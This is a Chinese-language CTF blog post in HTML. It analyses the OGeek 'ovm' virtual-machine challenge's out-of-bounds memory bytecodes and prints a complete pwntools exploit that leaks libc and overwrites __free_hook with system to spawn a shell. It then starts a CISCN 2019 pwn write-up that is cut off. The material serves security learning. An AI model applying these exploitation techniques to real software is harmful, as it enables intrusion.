@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ditto's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="越来越发现自己是真的太菜了，多复现题目吧…不写wp太容易忘了. Ogeek final ovm从ex师傅那里找到了源文件，然后做了做. 分析没有去掉符号表，比较好分析.寄存器，程序段，栈都以全局变量的形式存在: SP和IP寄存器保存在reg数组中:12345678write(1, &quot;PC: &quot;, 4uLL);_isoc99_scanf(&quot;%hd&quot;, &amp;amp;IP_);getchar();writ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些题目的复现...">
+<meta property="og:url" content="http://yoursite.com/2019/10/14/一些题目的复现/index.html">
+<meta property="og:site_name" content="ditto&#39;s blog">
+<meta property="og:description" content="越来越发现自己是真的太菜了，多复现题目吧…不写wp太容易忘了. Ogeek final ovm从ex师傅那里找到了源文件，然后做了做. 分析没有去掉符号表，比较好分析.寄存器，程序段，栈都以全局变量的形式存在: SP和IP寄存器保存在reg数组中:12345678write(1, &quot;PC: &quot;, 4uLL);_isoc99_scanf(&quot;%hd&quot;, &amp;amp;IP_);getchar();writ">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/10/14/一些题目的复现/1.png">
+<meta property="og:updated_time" content="2019-10-14T13:26:50.830Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一些题目的复现...">
+<meta name="twitter:description" content="越来越发现自己是真的太菜了，多复现题目吧…不写wp太容易忘了. Ogeek final ovm从ex师傅那里找到了源文件，然后做了做. 分析没有去掉符号表，比较好分析.寄存器，程序段，栈都以全局变量的形式存在: SP和IP寄存器保存在reg数组中:12345678write(1, &quot;PC: &quot;, 4uLL);_isoc99_scanf(&quot;%hd&quot;, &amp;amp;IP_);getchar();writ">
+<meta name="twitter:image" content="http://yoursite.com/2019/10/14/一些题目的复现/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/14/一些题目的复现/">
+
+
+
+
+
+  <title>一些题目的复现... | ditto's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ditto's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/14/一些题目的复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ditto">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/my.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ditto's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一些题目的复现...</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-14T20:54:09+08:00">
+                2019-10-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>越来越发现自己是真的太菜了，多复现题目吧…不写wp太容易忘了.</p>
+<h3 id="Ogeek-final-ovm"><a href="#Ogeek-final-ovm" class="headerlink" title="Ogeek final ovm"></a>Ogeek final ovm</h3><p>从ex师傅那里找到了源文件，然后做了做.</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>没有去掉符号表，比较好分析.<br>寄存器，程序段，栈都以全局变量的形式存在:<br><img src="/2019/10/14/一些题目的复现/1.png" alt=""></p>
+<p>SP和IP寄存器保存在reg数组中:<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">"PC: "</span>, <span class="number">4</span>uLL)<span class="comment">;</span></span><br><span class="line">_isoc99_scanf(<span class="string">"%hd"</span>, &amp;IP_)<span class="comment">;</span></span><br><span class="line">getchar()<span class="comment">;</span></span><br><span class="line">write(<span class="number">1</span>, <span class="string">"SP: "</span>, <span class="number">4</span>uLL)<span class="comment">;</span></span><br><span class="line">_isoc99_scanf(<span class="string">"%hd"</span>, &amp;SP_)<span class="comment">;</span></span><br><span class="line">getchar()<span class="comment">;</span></span><br><span class="line">reg[<span class="number">13</span>] = SP_<span class="comment">;</span></span><br><span class="line">reg[<span class="number">15</span>] = IP_<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<h5 id="字节码分析"><a href="#字节码分析" class="headerlink" title="字节码分析"></a>字节码分析</h5><p>一个字节码的长度为4字节：<br>高位第一个字节标志着字节码的种类(add,sub,push,pop…等)<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">opcode</span> = HIBYTE(opcode)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p>第一个操作数为高位倒数第二个字节的低位4bit:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op1 = (opcode &amp; <span class="number">0xF0000</span>u) <span class="meta">&gt;&gt; </span><span class="number">16</span>;</span><br></pre></td></tr></table></figure></p>
+<p>第二个操作数为高位倒数第三个字节的低位4bit:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op2 = (opcode &amp; <span class="number">0xF00</span>) <span class="meta">&gt;&gt; </span><span class="number">8</span>;</span><br></pre></td></tr></table></figure></p>
+<p>第三个操作数为低位第一个字节的低位4bit:<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">op3</span> = opcode &amp; <span class="number">0</span>xF;</span><br></pre></td></tr></table></figure></p>
+<p>分析完，有用的字节码大概这些:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opcode</span><span class="params">(opcode,op1,op2,op3)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> times</span><br><span class="line">    s = (opcode&lt;&lt;<span class="number">24</span>)+(op1&lt;&lt;<span class="number">16</span>)+(op2&lt;&lt;<span class="number">8</span>)+op3</span><br><span class="line">    times+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> str(s)+<span class="string">'\n'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ADD</span><span class="params">(op1,op2,op3)</span>:</span><span class="comment">#reg[op1] = reg[op2] + reg[op3];</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x70</span>,op1,op2,op3)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SUB</span><span class="params">(op1,op2,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x80</span>,op1,op2,op3)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUSH</span><span class="params">(op1)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x50</span>,op1,<span class="number">0</span>,<span class="number">0</span>) <span class="comment"># stack[SP] = reg[op1]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POP</span><span class="params">(op1)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x60</span>,op1,<span class="number">0</span>,<span class="number">0</span>) <span class="comment"># reg[op1] = Stack[SP]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MOV_TO_REG</span><span class="params">(op1,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x30</span>,op1,<span class="number">0</span>,op3)<span class="comment"># reg[op1] = mem[reg[op3]]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MOV_TO_MEM</span><span class="params">(op1,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x40</span>,op3,<span class="number">0</span>,op1)<span class="comment"># MEM[reg[op1]] = reg[op2]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LSHIFT</span><span class="params">(op1,op2,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xC0</span>,op1,op2,op3)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSHIFT</span><span class="params">(op1,op2,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xD0</span>,op1,op2,op3)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EXIT</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xd1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这里使用MOV_TO_REG和MOV_TO_MEM的时候存在越界读取.可以相对于memory上溢或者下溢.</p>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>利用相对偏移，读取GOT表，然后修改comment指向<strong>free_hook附近，然后修改</strong>free_hook为system即可，程序最后这里可以修改comment指向的内容<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">"HOW DO YOU FEEL AT OVM?<span class="subst">\n</span>"</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">read(<span class="number">0</span>, comment[<span class="number">0</span>], <span class="number">0x8C</span>uLL);</span><br><span class="line">sendcomment(comment[<span class="number">0</span>]);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">"Bye<span class="subst">\n</span>"</span>, <span class="number">4</span>uLL);</span><br></pre></td></tr></table></figure></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./ovm"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file,checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">"i386"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">"amd64"</span> :</span><br><span class="line">        libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec = <span class="keyword">False</span>) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *($text_base+0x0000000000000B60)</span></span><br><span class="line"><span class="string">    b *($text_base+0x0000000000000D4B)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hex(address))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(pc,SP,size,code)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"PC: "</span>,str(pc))</span><br><span class="line">    a.sendlineafter(<span class="string">"SP: "</span>,str(SP))</span><br><span class="line">    a.sendlineafter(<span class="string">"CODE SIZE: "</span>,str(size))</span><br><span class="line">    a.recvuntil(<span class="string">"CODE: "</span>)</span><br><span class="line">    a.send(code)</span><br><span class="line">times = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opcode</span><span class="params">(opcode,op1,op2,op3)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> times</span><br><span class="line">    s = (opcode&lt;&lt;<span class="number">24</span>)+(op1&lt;&lt;<span class="number">16</span>)+(op2&lt;&lt;<span class="number">8</span>)+op3</span><br><span class="line">    times+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> str(s)+<span class="string">'\n'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ADD</span><span class="params">(op1,op2,op3)</span>:</span><span class="comment">#reg[op1] = reg[op2] + reg[op3];</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x70</span>,op1,op2,op3)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SUB</span><span class="params">(op1,op2,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x80</span>,op1,op2,op3)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUSH</span><span class="params">(op1)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x50</span>,op1,<span class="number">0</span>,<span class="number">0</span>) <span class="comment"># stack[SP] = reg[op1]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POP</span><span class="params">(op1)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x60</span>,op1,<span class="number">0</span>,<span class="number">0</span>) <span class="comment"># reg[op1] = Stack[SP]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MOV_TO_REG</span><span class="params">(op1,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x30</span>,op1,<span class="number">0</span>,op3)<span class="comment"># reg[op1] = mem[reg[op3]]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MOV_TO_MEM</span><span class="params">(op1,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0x40</span>,op3,<span class="number">0</span>,op1)<span class="comment"># MEM[reg[op1]] = reg[op2]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LSHIFT</span><span class="params">(op1,op2,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xC0</span>,op1,op2,op3)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSHIFT</span><span class="params">(op1,op2,op3)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xD0</span>,op1,op2,op3)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EXIT</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> opcode(<span class="number">0xd1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">SP_index = <span class="number">13</span></span><br><span class="line">IP_index = <span class="number">15</span> </span><br><span class="line">offset_free_got = <span class="number">-62</span></span><br><span class="line">__free_hook = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">free = libc.symbols[<span class="string">"free"</span>]</span><br><span class="line">offset = __free_hook - free</span><br><span class="line"><span class="keyword">print</span> hex(offset)</span><br><span class="line">code=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">61</span>):</span><br><span class="line">    code+=SUB(<span class="number">1</span>,<span class="number">1</span>,<span class="number">13</span>)<span class="comment">#reg[1]=-31</span></span><br><span class="line">code+=MOV_TO_REG(<span class="number">0</span>,<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">code+=SUB(<span class="number">1</span>,<span class="number">1</span>,<span class="number">13</span>)</span><br><span class="line">code+=MOV_TO_REG(<span class="number">2</span>,<span class="number">1</span>)<span class="comment"># reg[0] = 7fff reg[2] = F7A914F0</span></span><br><span class="line">code+=ADD(<span class="number">3</span>,<span class="number">3</span>,<span class="number">15</span>)<span class="comment">#reg[3] = 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">    code+=LSHIFT(<span class="number">3</span>,<span class="number">3</span>,<span class="number">13</span>)</span><br><span class="line">code+=ADD(<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line">code+=ADD(<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">code+=ADD(<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">code+=RSHIFT(<span class="number">4</span>,<span class="number">4</span>,<span class="number">13</span>)</span><br><span class="line">code+=RSHIFT(<span class="number">4</span>,<span class="number">4</span>,<span class="number">13</span>)</span><br><span class="line">code+=ADD(<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xad48</span>+<span class="number">8</span>):</span><br><span class="line">    code+=SUB(<span class="number">3</span>,<span class="number">3</span>,<span class="number">13</span>)</span><br><span class="line">code+=ADD(<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>)<span class="comment">#reg[2]=free_hook&amp;0xffffffff</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">54</span>):</span><br><span class="line">    code+=ADD(<span class="number">1</span>,<span class="number">1</span>,<span class="number">13</span>)</span><br><span class="line">code+=MOV_TO_MEM(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">code+=ADD(<span class="number">1</span>,<span class="number">1</span>,<span class="number">13</span>)</span><br><span class="line">code+=MOV_TO_MEM(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">code+=EXIT()</span><br><span class="line">Init(<span class="number">0</span>,<span class="number">1</span>,times,code)</span><br><span class="line">a.recvuntil(<span class="string">"R0: "</span>)</span><br><span class="line">a1 = a.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">a.recvuntil(<span class="string">"R2: "</span>)</span><br><span class="line">a2 = a.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">libc_base=int(a1+a2,<span class="number">16</span>)-libc.symbols[<span class="string">"__free_hook"</span>]+<span class="number">8</span></span><br><span class="line">fuck(libc_base)</span><br><span class="line">a.recvuntil(<span class="string">"HOW DO YOU FEEL AT OVM?\n"</span>)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>+p64(libc_base+libc.symbols[<span class="string">"system"</span>]))</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="CISCN-2019-final-day1-pwn5"><a href="#CISCN-2019-final-day1-pwn5" class="headerlink" title="CISCN 2019 final day1 pwn5"></a>CISCN 2019 final day1 pwn5</h3><p>环境是2.27</p>
+<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>程序最开始调用init函数,这个函数打开了flag，并把文件描述符重定向到666.<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 init()</span><br><span class="line">&#123;</span><br><span class="line">  int fd; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  unsigned __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">"flag"</span>, <span class="number">0</span>);</span><br><span class="line">  if ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"no such file 